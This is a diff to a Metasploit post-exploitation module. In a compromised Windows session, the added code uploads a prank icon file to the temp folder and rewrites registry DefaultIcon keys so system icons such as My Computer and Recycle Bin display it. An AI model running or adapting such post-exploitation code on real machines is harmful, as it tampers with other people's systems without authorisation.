@@ -312,7 +312,34 @@ class Metasploit3 < Msf::Post
 	end
 	
 	def change_system_icons
-		#TODO UPLOAD VARIOUS .ico files, refer to this to get key to change => http://www.virtualplastic.net/html/icn_reg.html		
+		#TODO UPLOAD VARIOUS .ico files, refer to this to get key to change => http://www.virtualplastic.net/html/icn_reg.html
+		path = ::File.join(Msf::Config.install_root, "data", "post")
+                rick_picture_filename = "rick.ico"
+                rick_ico = ::File.join(path, rick_picture_filename)
+
+                tempdir = client.fs.file.expand_path("%TEMP%")
+                temp_picture = tempdir + "\\" +  Rex::Text.rand_text_alpha((rand(8)+6)) + ".ico"
+                print_status "uploading to => " + temp_picture
+                session.fs.file.upload_file("#{temp_picture}", rick_ico)
+		
+		
+		reg_keys = ["HKCR\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon", # My Computer
+				"HKCR\\CLSID\\{450D8FBA-AD25-11D0-98A8-0800361B1103}\\DefaultIcon", # My Documents 
+				"HKCR\\CLSID\\{2227A280-3AEA-1069-A2DE-08002B30309D}\\DefaultIcon", # Printers 
+				"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon", # Recycle Bin 
+				"HKCR\\CLSID\\{208D2C60-3AEA-1069-A2D7-08002B30309D}\\DefaultIcon", # Network Neighborhood 
+				"HKCR\\CLSID\\{0DF44EAA-FF21-4412-828E-260A8728E7F1}\\DefaultIcon", # Taskbar and Start Menu 
+				] 
+		reg_keys.each do |reg_key|	
+			registry_setvaldata(reg_key,"" ,"#{temp_picture}","REG_SZ")
+		end	
+=begin		
+		shell_icons_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell\ Icons"
+		registry_createkey("#{shell_icons_key}")
+		(1..40).each do |i|
+			registry_setvaldata("#{shell_icons_key}", "\"#{i}\"","\"#{temp_picture},0\"","REG_SZ")
+		end
+=end
 	end
 	
 	def change_loading_screen
